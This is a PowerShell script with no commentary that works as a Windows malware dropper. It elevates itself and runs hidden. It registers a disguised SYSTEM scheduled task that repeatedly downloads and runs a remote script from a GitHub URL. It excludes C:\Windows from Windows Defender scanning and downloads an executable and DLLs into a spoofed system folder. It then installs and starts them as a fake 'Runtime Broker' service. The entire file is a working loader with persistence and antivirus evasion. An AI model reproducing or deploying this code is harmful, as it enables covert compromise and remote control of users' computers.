function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
if (-not (Test-Admin)) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
    exit
}
$serviceName = "runtimebroker"
$downloadDir = "C:\Windows\SystemApps\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy"
$ps1URL = "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/task.ps1"
$taskName = 'CredentialEnrollmentManagerUserSvc_30471'
$windowsDir = "C:\Windows"
$urls = @(
    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/RuntimeBroker.exe.config",
    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/RuntimeBroker.exe",
    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/Newtonsoft.Json.dll",
    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/tskRuntimeBroker.ps1"
)
$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex (iwr '$ps1URL' -UseBasicParsing)`""
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd -MultipleInstances Parallel -Priority 1 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 2)
$Principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
$TriggerDate = Get-Date
$RandomHour = Get-Random -Minimum 9 -Maximum 15
$RandomMinute = Get-Random -Minimum 0 -Maximum 60
$GetDateTriggerRepetition = $TriggerDate.Date.AddHours($RandomHour).AddMinutes($RandomMinute)
$TriggerRepetition = New-ScheduledTaskTrigger -Once -At $GetDateTriggerRepetition -RepetitionInterval (New-TimeSpan -Minutes 300) -RepetitionDuration (New-TimeSpan -Days 3650)
if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    Register-ScheduledTask -TaskName $taskName -Action $Action -Trigger $TriggerRepetition -Principal $Principal -Settings $Settings -Description 'Keep your system software up to date. If this task is disabled or interrupted, your software will not be maintained, meaning security vulnerabilities may not be patched and features may not function properly.'
}
function Add-WindowsDefenderExclusion {
    param (
        [string]$path
    )
    try {
        Add-MpPreference -ExclusionPath $path
    } catch {
        Write-Error "$_"
    }
}
function Download-File {
    param (
        [string]$Url,
        [string]$Destination
    )
    try {
        Invoke-WebRequest -Uri $Url -OutFile $Destination
    } catch {
        Write-Error "$_"
    }
}
Add-WindowsDefenderExclusion -path $windowsDir
$service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
if (-not $service) {
    $servicePath = "C:\Windows\SystemApps\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\RuntimeBroker.exe"
    try {
        New-Service -Name $serviceName -DisplayName 'Runtime Broker' -BinaryPathName $servicePath -StartupType 'Automatic'
    } catch {
        Write-Error "$_"
        exit
    }
}
if ($service.Status -ne 'Running') {
    if (-not (Test-Path -Path $downloadDir)) {
        try {
            New-Item -ItemType Directory -Path $downloadDir | Out-Null
        } catch {
            Write-Error "$_"
            exit
        }
    }
    foreach ($url in $urls) {
        $fileName = [System.IO.Path]::GetFileName($url)
        $destination = "$downloadDir\$fileName"
        Download-File -Url $url -Destination $destination
    }
    try {
        Start-Service -Name $serviceName
    } catch {
        Write-Error "$_"
    }
}